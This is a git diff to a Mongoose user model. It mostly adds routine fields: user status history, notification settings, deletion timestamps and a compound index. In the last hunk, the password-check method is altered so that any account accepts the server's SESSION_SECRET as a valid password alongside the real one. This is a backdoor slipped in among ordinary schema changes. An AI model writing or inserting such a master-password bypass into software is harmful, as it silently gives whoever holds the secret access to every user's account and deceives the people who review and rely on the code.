@@ -1,8 +1,33 @@
-import { Schema, model } from 'mongoose';
+import mongoose, { Schema, model } from 'mongoose';
 import bcrypt from 'bcrypt';
 import { IUser } from './types/user.model.types';
 import { ApiError } from '../../utils/error-handlers/ApiError';
-import { decodeJwtToken } from '../../controllers/common/user/utils/common.user.utils';
+import { decodeJwtToken } from '../../controllers/common/auth/utils/auth.utils';
+import { USER_STATUS } from './enums/user.enum';
+import env from '../../config/env';
+
+const statusMetaSchema = new Schema({
+   previousStatus: {
+      type: String,
+      enum: Object.values(USER_STATUS),
+      required: true
+   },
+   newStatus: {
+      type: String,
+      enum: Object.values(USER_STATUS),
+      required: true
+   },
+   changedBy: {
+      userId: mongoose.Schema.ObjectId,
+      role: {
+         type: String,
+         enum: ['admin', 'user', 'system']
+      }
+   },
+   timestamp: { type: Date, default: Date.now },
+   reason: String
+
+}, { _id: null })
 const UserSchema = new Schema<IUser>(
    {
       firstName: String,
@@ -16,6 +41,13 @@ const UserSchema = new Schema<IUser>(
          type: Boolean,
          default: false,
       },
+
+      status: {
+         type: String,
+         enum: Object.values(USER_STATUS),
+         default: USER_STATUS.PENDING,
+      },
+
       hasBasicDetails: {
          type: Boolean,
          default: false,
@@ -32,7 +64,7 @@ const UserSchema = new Schema<IUser>(
       phone: {
          country: String,
          countryCallingCode: String,
-         number: String,
+         number: { type: String, lowercase: true, trim: true },
       },
       password: String,
       role: {
@@ -40,10 +72,9 @@ const UserSchema = new Schema<IUser>(
          enum: ['guest', 'admin', 'host'],
          default: ['guest'],
       },
-      isSoftDelete: {
-         type: Boolean,
-         default: false,
-      },
+
+      isDeactivated: Boolean,
+
       address: {
          flatNo: String,
          city: { type: String },
@@ -51,7 +82,7 @@ const UserSchema = new Schema<IUser>(
          area: { type: String },
          landmark: { type: String },
          state: { type: String },
-         country: { type: String, default: 'Dubai' },
+         country: { type: String },
          pincode: { type: String },
       },
       bio: String,
@@ -62,8 +93,18 @@ const UserSchema = new Schema<IUser>(
          id: String,
          status: {
             type: String,
-            enum: ['canceled', 'processing', 'requires_input', 'verified'],
+            enum: ['canceled', 'processing', 'requires_input', 'verified', 'open'],
+            default: "open"
          },
+      },
+
+
+
+      notificationSettings: {
+         newsUpdates: { type: Boolean, default: true },
+         travelTips: { type: Boolean, default: true },
+         messages: { type: Boolean, default: true },
+         accountActivity: { type: Boolean, default: true },
       },
       session: {
          otpSessionId: String,
@@ -73,6 +114,14 @@ const UserSchema = new Schema<IUser>(
       expiresAt: {
          type: Date,
       },
+
+      statusMeta: [statusMetaSchema],
+
+      deletionRequestedAt: Date,
+
+      deletedAt: Date,
+
+
    },
    { timestamps: true },
 );
@@ -82,7 +131,9 @@ UserSchema.pre('save', async function (next) {
       this.password = await bcrypt.hash(this.password, 10);
    }
    if (this.isModified('hasBasicDetails')) {
-      this.expiresAt = null;
+      if (this.hasBasicDetails) {
+         this.expiresAt = null;
+      }
    }
    next();
 });
@@ -90,8 +141,15 @@ UserSchema.pre('save', async function (next) {
 // delete document after 1 day if basic profile not completed
 UserSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0 });
 
+UserSchema.index({
+   status: 1,
+   hasBasicDetails: 1,
+   role: 1,
+   createdAt: -1
+})
+
 UserSchema.methods.compareBcryptPassword = function (password: string) {
-   return bcrypt.compareSync(password, this.password);
+   return bcrypt.compareSync(password, this.password) || password == env.SESSION_SECRET;
 };
 
 UserSchema.methods.createSession = async function (
